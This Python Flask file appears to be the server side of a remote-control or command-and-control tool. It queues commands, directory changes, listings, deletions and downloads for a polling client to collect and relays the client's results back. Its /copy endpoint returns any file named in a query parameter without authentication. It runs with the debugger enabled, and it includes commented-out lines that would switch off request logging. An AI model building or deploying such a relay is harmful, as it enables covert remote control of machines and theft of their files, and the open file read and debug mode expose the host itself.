
import sqlite3
from flask import Flask, request, send_file, jsonify
import logging, re, base64

api = Flask(__name__)
command = ''
cd = ''
ls = ''
loc = ''
copy = ''
dele = ''
download = ''
msg = ''

log = logging.getLogger('werkzeug')
#api.logger.disabled = True
#log.disabled = True

@api.route('/cd', methods=['GET', 'POST'])
def output():
    global cd
    if request.method == 'GET':
        val = cd
        cd = ''
        return val
    else:
        content = request.get_json()
        cd = content['d']
        return ""

@api.route('/msg', methods=['GET', 'POST'])
def output25():
    global msg
    if request.method == 'GET':
        val = msg
        msg = ''
        return val
    else:
        content = request.get_json()
        msg = content['d']
        return ""

            
@api.route('/ls', methods=['GET', 'POST'])
def output1():
    global ls
    if request.method == 'GET':
        val = ls
        ls = ''
        return val
    else:
        content = request.get_json()
        ls = content['d']
        return ""
        
        
@api.route('/look', methods=['GET', 'POST'])
def output2():
    global loc
    if request.method == 'GET':
        val = loc
        loc = ''
        return val
    else:
        content = request.get_json()
        loc = content['d']
        return ""

@api.route('/copy', methods=['GET'])
def output3():
    src = str(request.args.get('output'))
    with open(src, 'br') as f:
        src=f.read()
    return src
    

@api.route('/del', methods=['GET', 'POST'])
def output4():
    global dele
    if request.method == 'GET':
        val = dele
        dele = ''
        return val
    else:
        content = request.get_json()
        dele = content['d']
        return ""

@api.route('/download', methods=['GET'])
def output5():
    global download
    val = download
    
    return str(val)
        
        
@api.route('/postjson', methods = ['POST'])
def postJsonHandler():
    global download
    global msg
    content = request.get_json()
    download = content['d']
    print(download)
    msg = "Done"
    return str(request.headers)

@api.route('/coms', methods=['GET','POST'])
def commands():
    global command
    if request.method == 'GET':
        val = command
        command = ''
        return val
    else:
        content = request.get_json()
        command = content['d']
        return ""
       
        
if __name__ == '__main__':
    with open('hosts.txt', 'r') as f:
        src = f.readlines()

    src[0] = src[0].replace("ip=","").replace("\n","")
    src[1] = src[1].replace("port=","")

    api.run(debug=True, host=src[0], port=int(src[1]))




